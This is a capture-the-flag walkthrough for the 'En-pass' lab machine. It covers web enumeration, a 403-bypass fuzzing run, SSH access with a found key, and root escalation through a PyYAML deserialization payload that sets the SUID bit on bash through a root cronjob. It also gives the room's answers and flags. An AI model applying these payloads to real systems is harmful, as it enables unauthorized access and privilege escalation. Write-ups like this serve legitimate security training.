# En-pass

Get what you can't.

Think-out-of-the-box

# Name The Path.

Nmap detects 2 open ports:

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Enumeration (1st level)

A first enumeration of the web server will reveal several resources:

~~~
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ gobuster dir -u http://10.10.67.150:8001/ -x php,txt,old,bak,zip,tar -w /usr/share/wordlists/dirb/common.txt

[REDACTED]

/403.php              (Status: 403) [Size: 1123]
/index.html           (Status: 200) [Size: 2563]
/reg.php              (Status: 200) [Size: 2417]
/server-status        (Status: 403) [Size: 279] 
/web                  (Status: 301) [Size: 317] [--> http://10.10.67.150:8001/web/]
/zip                  (Status: 301) [Size: 317] [--> http://10.10.67.150:8001/zip/]
                                                                                   
===============================================================
2021/05/12 16:38:07 Finished
===============================================================
~~~

## The zip directory

This directory is a rabbit hole. You'll get several zip archives that all contain the same useless information: a file containing the string `sadman`. I initially thought it could be a username, but it doesn't lead anywhere.

## The web directory

Enumerating the `/web` directory reveals a subdirectory:

~~~
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ gobuster dir -u http://10.10.67.150:8001/web/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.150:8001/web/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/12 15:40:56 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/resources            (Status: 301) [Size: 327] [--> http://10.10.67.150:8001/web/resources/]
                                                                                             
===============================================================
2021/05/12 15:42:17 Finished
===============================================================
~~~

Continuing with enumerations of the subdirectories leads to http://10.10.67.150:8001/web/resources/infoseek/configure/key:

~~~
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ gobuster dir -u http://10.10.67.150:8001/web/resources/infoseek/configure/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.67.150:8001/web/resources/infoseek/configure/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/12 15:56:06 Starting gobuster in directory enumeration mode
===============================================================
/key                  (Status: 200) [Size: 1766]
Progress: 2119 / 220561 (0.96%)                ^C
[!] Keyboard interrupt detected, terminating.
                                                
===============================================================
2021/05/12 15:56:38 Finished
===============================================================
~~~

Answer: `/web/resources/infoseek/configure/key`


# What is the user flag?

*Hint: The path you get will forbid to see but you can bypass it.*

## SSH private key

The file is a SSH private key.

~~~
$ chmod 600 key
$ ssh -i key sadman@10.10.67.150
~~~

It's password protected, and John fails to crack the password.

~~~
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ /data/src/john/run/ssh2john.py key > ssh.hash                                                             130 ⨯
zsh: no such file or directory: /data/src/john/run/ssh2john.py
                                                                                                                    
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ /data/src/john/run/ssh2john.py key > ssh.hash                                                             127 ⨯
                                                                                                                    
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ /data/src/john/run/john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 DONE (2021-05-12 16:02) 0g/s 2716Kp/s 2716Kc/s 2716KC/sa6_123..*7¡Vamos!
~~~

## The reg.php page

Let's continue with the other resources found previously. The `/reg.php` page is a challenge, and the PHP source code is actually revealed:

```php
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ curl -s http://10.10.67.150:8001/reg.php | tr -s '\n'                                                       1 ⨯

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>En-Pass</title>

[REDACTED]

</head>
<body>
<img src="sau.jpg" alt="sau">
<h1>EN-PASS</h1>
<div  id="container">
  <form method="POST" action="/reg.php">
   
    <input type="text" id="title" name="title" placeholder="Input">
   
    <input type="submit" value="Submit">
<h4 style='color:rgb(83, 21, 165);'> <?php
     
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);
          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          
          
          }
          if ( ($sum) == 9 ){
            
              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";
        
            
            }
            
                    else{
                      echo "  Try Try!!";
                
                    }
          }
        
          else{
            echo "  Try Again!! ";
      
          }     
 
  }
 
?>
</h4>
  </form>
</div>
</body>
</html>
```

There are a couple of tests to pass. After debugging in a sandbox, I eventually found a valid string: `##,??,??,##,??,#,??,#,###`

~~~
┌──(kali㉿kali)-[/data/En-pass]
└─$ curl -s -XPOST -d "title=##,??,??,##,??,#,??,#,###" http://10.10.67.150:8001/reg.php | grep Nice
              echo " Congo You Got It !! Nice ";
</h4><h3 style='position: absolute;left:40%;top:46%;color:white;'>Nice. Password : cimihan_are_you_here?  </h3>
~~~

## 403 Fuzzing

At this stage, we have the password for the SSH private key, but no valid user. As the hint says `The path you get will forbid to see but you can bypass it`, I thought of the last resource we have: the `403.php` page. After some searches on the Internet to bypass 403 pages, you'll eventually find this [fuzzing tool](https://github.com/intrudir/403fuzzer).

Open BurpSuite and run 403fuzzer:

~~~
┌──(kali㉿kali)-[/data/src/403fuzzer]
└─$ python3 403fuzzer.py -u http://10.10.67.150:8001/403.php -hc 403,404 --proxy http://localhost:8080

Sending header payloads...

Proxy flag was detected. Skipping trailing dot payload...

Sending URL payloads...
Response Code: 200  Length: 2563  Payload: /#403.php
Response Code: 200  Length: 2563  Payload: /#?403.php
Response Code: 400  Length: 306 Payload: /%2e%2e/403.php
Response Code: 200  Length: 2563  Payload: /#403.php
Response Code: 400  Length: 306 Payload: /%2e%2e/403.php
Response Code: 200  Length: 2563  Payload: /
Response Code: 200  Length: 2563  Payload: /
Response Code: 200  Length: 2563  Payload: /
Response Code: 200  Length: 2563  Payload: /403.php%3b/%2e.
Response Code: 200  Length: 2563  Payload: /403.php%3b/..
Response Code: 200  Length: 2563  Payload: /403.php/%2e%2e
Response Code: 200  Length: 2563  Payload: /403.php/%2e%2e/
Response Code: 200  Length: 2563  Payload: /403.php/..
Response Code: 200  Length: 2563  Payload: /403.php/../
Response Code: 200  Length: 2563  Payload: /403.php/../../
Response Code: 200  Length: 2563  Payload: /403.php/../../../
Response Code: 200  Length: 2563  Payload: /403.php/../../..//
Response Code: 200  Length: 2563  Payload: /403.php/../..//
Response Code: 200  Length: 2563  Payload: /403.php/../..//../
Response Code: 200  Length: 2563  Payload: /403.php/.././../
Response Code: 200  Length: 2563  Payload: /403.php/../.;/../
Response Code: 200  Length: 2563  Payload: /403.php/..//
Response Code: 200  Length: 2563  Payload: /403.php/..//../
Response Code: 200  Length: 2563  Payload: /403.php/..//../../
Response Code: 200  Length: 2563  Payload: /403.php/../;/../
Response Code: 200  Length: 917 Payload: /403.php/..;/ <------------------ interesting
Response Code: 200  Length: 917 Payload: /403.php/..;//../
Response Code: 200  Length: 2563  Payload: /403.php//../../
Response Code: 200  Length: 2563  Payload: /403.php;%2f%2f/../
Response Code: 200  Length: 2563  Payload: /403.php;%2f..%2f/../
Response Code: 200  Length: 2563  Payload: /403.php;/%2e%2e
Response Code: 200  Length: 2563  Payload: /403.php;/%2e%2e/
Response Code: 200  Length: 2563  Payload: /403.php;/%2e.
Response Code: 200  Length: 2563  Payload: /403.php;/.%2e
Response Code: 200  Length: 2563  Payload: /403.php;/..
Response Code: 200  Length: 2563  Payload: /403.php;/../
Response Code: 200  Length: 2563  Payload: /403.php;/../../
Response Code: 200  Length: 2563  Payload: /403.php;/../..//
Response Code: 200  Length: 2563  Payload: /403.php;/.././../
Response Code: 200  Length: 2563  Payload: /403.php;/../.;/../
Response Code: 200  Length: 2563  Payload: /403.php;/..//
Response Code: 400  Length: 306 Payload: /403.php;/..//%2e%2e/
Response Code: 200  Length: 2563  Payload: /403.php;/..//../
Response Code: 200  Length: 2563  Payload: /403.php;/..///
Response Code: 200  Length: 2563  Payload: /403.php;/../;/../
Response Code: 200  Length: 2563  Payload: /403.php;/..
Response Code: 200  Length: 2563  Payload: /403.php;//../../
Response Code: 400  Length: 306 Payload: /;/..//%2e%2e/403.php
Response Code: 200  Length: 2563  Payload: /
Response Code: 200  Length: 2563  Payload: /#403.php
Response Code: 200  Length: 2563  Payload: /
Response Code: 200  Length: 2563  Payload: /
Response Code: 200  Length: 2563  Payload: /
Response Code: 200  Length: 2563  Payload: /
Response code: 200   Response length: 0           Sent OPTIONS method. 

Response length was 0 so probably NOT worth checking out....

Response Headers: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 0
~~~

Cycling in BurpSuite through the requests with a 200 HTTP code, we eventually find the good one:

~~~
GET /403.php/..;/ HTTP/1.1
Host: 10.10.67.150:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

~~~

Which generated the below response:

~~~
HTTP/1.1 200 OK
Date: Wed, 12 May 2021 17:07:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 917
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>En-Pass</title>

[REDACTED]

<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>
</body>
</html>   
~~~

## SSH Connection

We now have all information to connect to the SSH service:

* Username: `imsau`
* Passphrase: `cimihan_are_you_here?`

~~~
┌──(kali㉿kali)-[/data/En-pass/files]
└─$ ssh -i key imsau@10.10.67.150
Enter passphrase for key 'key': cimihan_are_you_here?
$ cat user.txt  
1c5ccb6ce6f3561e302e0e516c633da9
~~~

User flag: `1c5ccb6ce6f3561e302e0e516c633da9`

# What is the root flag?

## Cronjob

Running `linpeas.sh` won't really be helpful. Running `pspy64` will reveal a cronjob run by root every minute:

~~~
2021/05/12 19:02:01 CMD: UID=0    PID=22837  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/05/12 19:02:01 CMD: UID=0    PID=22836  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/05/12 19:02:01 CMD: UID=0    PID=22835  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/05/12 19:02:01 CMD: UID=0    PID=22834  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/05/12 19:02:01 CMD: UID=0    PID=22833  | /usr/sbin/CRON -f 
2021/05/12 19:02:01 CMD: UID=0    PID=22832  | /usr/sbin/CRON -f 
2021/05/12 19:02:01 CMD: UID=0    PID=22838  | sudo chown root:root /tmp/file.yml 
2021/05/12 19:02:01 CMD: UID=0    PID=22839  | sudo /usr/bin/python /opt/scripts/file.py 
2021/05/12 19:02:05 CMD: UID=0    PID=22840  | ps -e -o pid,ppid,state,command 
2021/05/12 19:03:01 CMD: UID=0    PID=22846  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/05/12 19:03:01 CMD: UID=0    PID=22845  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/05/12 19:03:01 CMD: UID=0    PID=22844  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/05/12 19:03:01 CMD: UID=0    PID=22843  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/05/12 19:03:01 CMD: UID=0    PID=22842  | /usr/sbin/CRON -f 
2021/05/12 19:03:01 CMD: UID=0    PID=22841  | /usr/sbin/CRON -f 
2021/05/12 19:03:01 CMD: UID=0    PID=22847  | sudo chown root:root /tmp/file.yml 
2021/05/12 19:03:01 CMD: UID=0    PID=22848  | sudo /usr/bin/python /opt/scripts/file.py 
2021/05/12 19:03:07 CMD: UID=0    PID=22849  | ps -e -o pid,ppid,state,command 
~~~

## The script

The cron job runs the following python script with `sudo` and removes the `/tmp/file.yml` file.

```python
imsau@enpass:/opt/scripts$ cat file.py 
#!/usr/bin/python
import yaml


class Execute():
  def __init__(self,file_name ="/tmp/file.yml"):
    self.file_name = file_name
    self.read_file = open(file_name ,"r")

  def run(self):
    return self.read_file.read()

data  = yaml.load(Execute().run())
```

## Exploit

We don't have write access to the script itself, but searching for exploits affecting the yaml library that is imported will lead to [this issue](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation).

Let's exploit it:

~~~
$ cp `which bash` /tmp/bash
$ cat > /tmp/file.yml << EOF
!!python/object/new:os.system ["chown root /tmp/bash;chmod u+s /tmp/bash"]
EOF
~~~

## Root shell

After a minute, we have a root shell:

~~~
imsau@enpass:/tmp$ ./bash -p
bash-4.3# cat /root/root.txt
5d45f08ee939521d59247233d3f8faf
~~~

Root flag: `5d45f08ee939521d59247233d3f8faf`
